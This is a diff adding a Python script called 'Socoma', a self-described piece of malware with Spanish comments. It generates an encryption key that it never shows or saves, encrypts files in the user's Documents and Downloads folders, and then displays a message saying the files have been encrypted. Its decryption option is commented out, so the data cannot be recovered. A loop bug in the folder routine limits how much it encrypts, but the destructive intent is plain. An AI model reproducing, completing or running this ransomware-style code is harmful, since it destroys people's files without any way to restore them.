@@ -1,0 +1,107 @@
+import os 
+from cryptography.fernet import Fernet 
+import tkinter as tk
+from tkinter import messagebox
+
+
+
+def startsocoma():
+    # SOCOMA MALWARE, DO NOT USE THIS CODE FOR MALICIOUS PURPOSES
+    # SOCOMA VIRUS, NO USES ESTE CODIGO PARA USOS MALICIOSOS
+
+    ##########################################
+    # ____   ___   ____ ___  __  __    _     #
+    #/ ___| / _ \ / ___/ _ \|  \/  |  / \    #
+    #\___ \| | | | |  | | | | |\/| | / _ \   #
+    # ___) | |_| | |__| |_| | |  | |/ ___ \  #
+    #|____/ \___/ \____\___/|_|  |_/_/   \_\ #
+    # Autor: Erik                            #
+    ##########################################
+
+
+
+
+    def generar_llave(): 
+        """Genera una llave de encriptación Fernet""" 
+        llave = Fernet.generate_key() 
+        return llave 
+
+    def encriptar_archivo(archivo, llave): 
+        
+        """Encripta un archivo utilizando la llave proporcionada""" 
+        f = Fernet(llave) 
+        with open(archivo, 'rb') as file: archivo_encriptado = f.encrypt(file.read()) 
+        with open(archivo, 'wb') as file: file.write(archivo_encriptado) 
+        
+    def desencriptar_archivo(archivo, llave): 
+        """Desencripta un archivo utilizando la llave proporcionada""" 
+        f = Fernet(llave) 
+        with open(archivo, 'rb') as file: archivo_desencriptado = f.decrypt(file.read()) 
+        with open(archivo, 'wb') as file: file.write(archivo_desencriptado) 
+        
+
+    def encriptar_carpeta(carpeta, llave): 
+        """Encripta todos los archivos de una carpeta""" 
+        for root, dirs, files in os.walk(carpeta): 
+            for file in files: archivo = os.path.join(root, file) 
+            encriptar_archivo(archivo, llave) 
+            
+    def desencriptar_carpeta(carpeta, llave): 
+        """Desencripta todos los archivos de una carpeta""" 
+        for root, dirs, files in os.walk(carpeta): 
+            for file in files: archivo = os.path.join(root, file)
+            desencriptar_archivo(archivo, llave) 
+
+
+        # Ejemplo de uso 
+    if __name__ == '__main__': carpeta = os.path.join(os.path.expanduser("~"), "Documents")
+    # reemplaza con la carpeta que deseas encriptar 
+
+
+    llave = generar_llave() 
+
+    # HACEMOS QUE NO MUESTRE LA LLAVE GENERADA
+    """
+    print(f'Llave generada: {llave}') # Encripta la carpeta 
+    """
+
+    encriptar_carpeta(carpeta, llave) 
+
+    if __name__ == '__main__': carpeta = os.path.join(os.path.expanduser("~"), "Downloads")
+
+
+    encriptar_carpeta(carpeta, llave)
+
+
+    print(r"""
+    ____   ___   ____ ___  __  __    _    
+    / ___| / _ \ / ___/ _ \|  \/  |  / \   
+    \___ \| | | | |  | | | | |\/| | / _ \  
+    ___) | |_| | |__| |_| | |  | |/ ___ \ 
+    |____/ \___/ \____\___/|_|  |_/_/   \_\
+
+    """)
+
+    print(f'Carpeta encriptada con éxito')
+    print(f'Socoma ha corrido con éxito') 
+
+
+
+    # ESTO PERMITE QUE SE DESENCRIPTE LA CARPETA
+    """
+
+    opcion = input("¿Quieres desencriptar el archivo? (y/n): ").lower().strip()
+    if opcion == 'y':
+            desencriptar_carpeta(carpeta, llave) 
+            print(f'Carpeta desencriptada con éxito')
+            messagebox.showinfo("Encriptacion", "Carpeta encriptada con éxito")    
+
+    """
+
+    messagebox.showinfo("Hackeado - Socoma", "Sus archivos han sido encriptados")
+
+
+    print(f'-----------------------------------------------')
+
+def ver():
+    print("Socoma 2.0")
